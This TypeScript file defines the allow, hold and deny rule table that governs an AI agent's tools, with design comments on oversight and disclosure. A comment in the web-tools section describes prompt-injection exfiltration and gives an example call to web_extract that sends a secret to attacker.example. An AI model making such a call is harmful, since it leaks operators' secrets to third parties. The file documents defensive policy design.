import type { PolicyRule } from './types.js';

// THE rule table. One file, reviewed as prose as much as code.
//
// Each rule carries the sentence a human reads in "What it may do alone". That
// co-location is the whole trick (design §4.3.1): the only way to change what
// the UI says is to change the rule, so they cannot drift — there is nothing to
// keep in sync. `capability-lint.ts` enforces the clause's shape; the verdict
// supplies the frame, so an author cannot write an `allow` phrase that reads
// like a `deny`.
//
// Ordering is load-bearing: `evaluate` takes the first match, so a narrow rule
// (with `when`) must precede the broad rule for the same tool. rules.test.ts
// fails the build if that inverts.
//
// Rules match on the **ax-native tool name** — post-classifier, `mcp__` prefixes
// already stripped (`agent-runner-core/src/tool-policy.ts:54`, sent as
// `call.name` at `:64`).
//
// A rule matching a tool that is not registered in a given deployment is INERT,
// not an error. Several rules below are exactly that, deliberately: they are
// rail rows describing what the agent may not do, and a row for a tool that is
// absent is still a true statement.
//
// Provenance for this table: docs/plans/2026-08-21-policy-condition-inventory.md
export const BUILTIN_RULES: readonly PolicyRule[] = [
  // -------------------------------------------------------------------------
  // Denies — rail rows for what `DISABLED_BUILTINS` already enforces (AW-1 E7).
  //
  // THESE FOUR WILL NEVER FIRE IN THE EVALUATOR, AND THAT IS EXPECTED. They are
  // rail rows, not enforcement. `classifySdkToolName` returns a `disabled`
  // class carrying NO `axName`, and the claude-sdk runner's `pre-tool-use.ts`
  // denies on it before `policy.preToolUse` runs — so a disabled builtin never
  // reaches `tool:pre-call` to be matched. On the aisdk runner the four are not
  // registered at all. Do not "verify" them with an evaluator test asserting a
  // deny from a live call; `DISABLED_BUILTINS` stays the enforcement.
  //
  // AW-1 suggested DERIVING these four from `DISABLED_BUILTINS` for one source
  // of truth. TASK-245 settled that it should not be: this rail is
  // runner-agnostic, and `DISABLED_BUILTINS` is ONE runner's list. What belongs
  // here is the intersection — the names BOTH runners keep from the agent, for
  // the same reason the sandbox floor below is the six both runners have. (The
  // import is also not available: the constant lives in
  // `@ax/agent-claude-sdk-runner`, whose package entrypoint IS the runner binary
  // and which does not re-export it — a cross-plugin runtime import, invariant 2.)
  //
  // So the names stay hand-written, and the drift is guarded instead of hoped
  // away: `scripts/__tests__/disabled-builtin-rail-drift.test.js` reads both
  // runners' sources as text and fails if this list stops equalling that
  // intersection. Add or remove a row here only in step with that test.
  {
    id: 'builtins.web-fetch',
    match: { tool: 'WebFetch' },
    verdict: 'deny',
    capability: 'reach websites outside the recorded connection',
    subject: 'agent',
    provenance: 'rule',
  },
  {
    id: 'builtins.web-search',
    match: { tool: 'WebSearch' },
    verdict: 'deny',
    capability: 'search the web outside the recorded connection',
    subject: 'agent',
    provenance: 'rule',
  },
  {
    id: 'builtins.task',
    match: { tool: 'Task' },
    verdict: 'deny',
    capability: 'start a hidden helper agent',
    subject: 'agent',
    provenance: 'rule',
  },
  {
    id: 'builtins.ask-user-question',
    match: { tool: 'AskUserQuestion' },
    verdict: 'deny',
    // AW-1 seeded this as "ask you a multiple-choice question". That clause
    // fails our own lint: `ask` is a verdict word, because "asks you first" is
    // the `hold` frame. The lint caught a genuine collision on its first real
    // input, which is the argument for having it — reworded rather than
    // exempted.
    capability: 'put a multiple-choice question on your screen',
    subject: 'agent',
    provenance: 'rule',
  },

  // -------------------------------------------------------------------------
  // Holds — NEW POLICY, not a codification.
  //
  // None of these three is held today: all three execute and raise their
  // approval afterwards, on the row or card they produced (AW-1 E19/E20).
  // Promoting them to `hold` moves the gate earlier and gives it a durable
  // Decision row instead of a turn-scoped card. Two consequences AW-4/AW-5 own:
  //
  //   1. A `hold` at pre-call means the tool never runs, so the pending
  //      row/card it would have created never exists. The Decision row carries
  //      the REPLAY, not a pointer at a draft.
  //   2. `skill_propose` is `executesIn: 'sandbox'`, so the host cannot replay
  //      it. A hold on it is executable only on the attended path, by the
  //      still-warm agent re-issuing the call — the first real case of "a hold
  //      the host cannot replay".
  //
  // None is marked `irreversible`: approving `request_capability` grants reach
  // that is revocable, `connector_propose` creates a pending zero-reach draft,
  // and an installed skill can be uninstalled. A future rule whose approval
  // cannot be taken back must set `irreversible: true` so AW-5 does not offer
  // an undo window it cannot honour (design H1).
  {
    // The canary's rule: @ax/skill-broker is pushed UNCONDITIONALLY into the
    // k8s preset, so `request_capability` is always in the catalog, and it is
    // host-executed and therefore replayable by AW-5.
    id: 'skills.request-capability',
    match: { tool: 'request_capability' },
    verdict: 'hold',
    capability: 'gain access to a new service or key',
    subject: 'agent',
    provenance: 'rule',
  },
  {
    // `connector_propose` and `skill_propose` are registered only when
    // AX_ALLOW_USER_INSTALLED_SKILLS=true. Inert otherwise — do not build a
    // canary on either.
    id: 'connectors.propose',
    match: { tool: 'connector_propose' },
    verdict: 'hold',
    capability: 'set up a new connection for you',
    subject: 'agent',
    provenance: 'rule',
  },
  {
    id: 'skills.propose',
    match: { tool: 'skill_propose' },
    verdict: 'hold',
    capability: 'install a skill it wrote for itself',
    subject: 'agent',
    provenance: 'rule',
  },

  // -------------------------------------------------------------------------
  // Allows — CATALOG FACTS, marked as such.
  //
  // `provenance: 'catalog'` is not decoration. These rows assert only "this
  // tool is reachable and no rule gates it", which is true about the system but
  // is NOT a reviewed policy decision, and the rail must not dress it up as one
  // (AW-1 §3.3). They are rules rather than derived rows because the sentence
  // still has to be authored somewhere, and this is the file where authored
  // sentences live.
  //
  // `web_search` / `web_extract` need a provider API key; the memory tools need
  // @ax/memory-strata. Inert where absent.
  //
  // The two web tools carry `effect: 'spends'` (TASK-263). They are not merely
  // reads: @ax/web-tools implements them by making a BILLED Anthropic Messages
  // call per invocation on the operator's key, so every use costs money. They
  // stay `allow` — a metered read with no third-party-visible effect is the
  // case where holding would be pure friction — but the spend is now declared
  // in the table instead of being a fact you had to know about
  // `@ax/web-tools`' implementation to discover.
  //
  // They stay `provenance: 'catalog'` deliberately. `catalog` claims "reachable
  // and no rule GATES it", which is still exactly true; declaring an effect is
  // a disclosure, not a gate, so promoting these to `'rule'` would overstate
  // how much the permission itself was deliberated.
  //
  // WEB_EXTRACT IS ALSO AN EXFILTRATION CHANNEL, and `spends` does not say so.
  // `url-guard.ts` refuses only localhost/.local/.internal, so any PUBLIC URL
  // the agent names is fetched — and under prompt injection (untrusted content
  // is the normal case on this surface, invariant 5)
  // `web_extract('https://attacker.example/?x=<secret>')` hands data to a
  // third party that sees the request, unrecoverably. By the definition in
  // `ToolEffect` that is `outward`.
  //
  // It is filed as `spends` anyway, and that is a deliberate, narrow choice
  // rather than a judgement that it is safe: marking it `outward` makes the
  // lint force a hold on every page read, which is a UX decision about a live
  // deployment and not one to smuggle in under a classification change.
  // TASK-330 carries the decision. Flagged here, in the table, because the
  // alternative is a rule that reads as though someone concluded it was
  // harmless.
  {
    id: 'web.search',
    match: { tool: 'web_search' },
    verdict: 'allow',
    capability: 'search the web',
    subject: 'agent',
    provenance: 'catalog',
    effect: 'spends',
  },
  {
    id: 'web.extract',
    match: { tool: 'web_extract' },
    verdict: 'allow',
    capability: 'read a web page you name',
    subject: 'agent',
    provenance: 'catalog',
    effect: 'spends',
  },
  {
    id: 'memory.search',
    match: { tool: 'memory_search' },
    verdict: 'allow',
    capability: 'look things up in its own memory',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'memory.read-section',
    match: { tool: 'memory_read_section' },
    verdict: 'allow',
    capability: 'read a section of its own memory',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'memory.note',
    match: { tool: 'memory_note' },
    verdict: 'allow',
    capability: 'write a note to its own memory',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'skills.search-catalog',
    match: { tool: 'search_catalog' },
    verdict: 'allow',
    capability: 'look through the skill catalog',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'artifacts.publish',
    match: { tool: 'artifact_publish' },
    verdict: 'allow',
    capability: 'publish a file for you to open',
    subject: 'agent',
    provenance: 'catalog',
  },

  // -------------------------------------------------------------------------
  // The sandbox floor — CATALOG FACTS about the six built-in tools every
  // runner gives an agent inside its own workspace (AW-14 / TASK-235, which
  // AW-1 named as the owner of "how the sandbox builtins are presented").
  //
  // AW-1 declined to seed these and said why: a `hold` on `Bash` fires on every
  // command and makes the surface unusable, and an `allow` row reading "run any
  // command on its own" is true but puts the whole blast radius in one line.
  // Both objections are about a HOLD or a one-liner. Neither is an argument for
  // silence, and silence is the one answer design H4 forbids: a capability that
  // is omitted reads to a human as "it cannot do that", and this is the single
  // largest thing an agent can actually do.
  //
  // So they ship as six `catalog` rows — same posture as `web.search` below.
  // The rows assert only "this tool is reachable and no rule gates it", which
  // is true, and they name the boundary that makes it survivable: the agent's
  // OWN workspace. They are not a policy decision and the rail does not dress
  // them up as one.
  //
  // Why these six and not the claude-sdk runner's fuller list: these are the
  // ones BOTH runners have (@ax/agent-aisdk-runner's `tools/builtins.ts`
  // registers exactly Bash, Read, Write, Edit, Glob, Grep; the claude-sdk
  // runner passes through the SDK's own set, which is a superset). A row for a
  // tool a given deployment does not register is INERT, not wrong — see the
  // header. The claude-sdk extras are covered by the rail's own
  // unrestricted-scope row rather than by a hand-copied list that would drift
  // against an SDK we do not version here.
  {
    id: 'sandbox.bash',
    match: { tool: 'Bash' },
    verdict: 'allow',
    capability: 'run commands inside its own private workspace',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'sandbox.read',
    match: { tool: 'Read' },
    verdict: 'allow',
    capability: 'read files in its own workspace',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'sandbox.write',
    match: { tool: 'Write' },
    verdict: 'allow',
    capability: 'create files in its own workspace',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'sandbox.edit',
    match: { tool: 'Edit' },
    verdict: 'allow',
    capability: 'change files in its own workspace',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'sandbox.glob',
    match: { tool: 'Glob' },
    verdict: 'allow',
    capability: 'find files by name in its own workspace',
    subject: 'agent',
    provenance: 'catalog',
  },
  {
    id: 'sandbox.grep',
    match: { tool: 'Grep' },
    verdict: 'allow',
    capability: 'search inside files in its own workspace',
    subject: 'agent',
    provenance: 'catalog',
  },

  // -------------------------------------------------------------------------
  // Deliberately NOT seeded (AW-1, as amended by AW-14):
  //   - Anything with a `when` predicate. No enforced condition keys on tool
  //     input today; ship `match: { tool }` and add `when` when a rule earns it.
  //   - Host / connector / approved-cap rows. Grant rows (§4.3.4), not rules.
  //   - MCP tools. Mechanical rows (§4.3.3); their only text is the vendor's,
  //     which is evidence, never our claim.
];
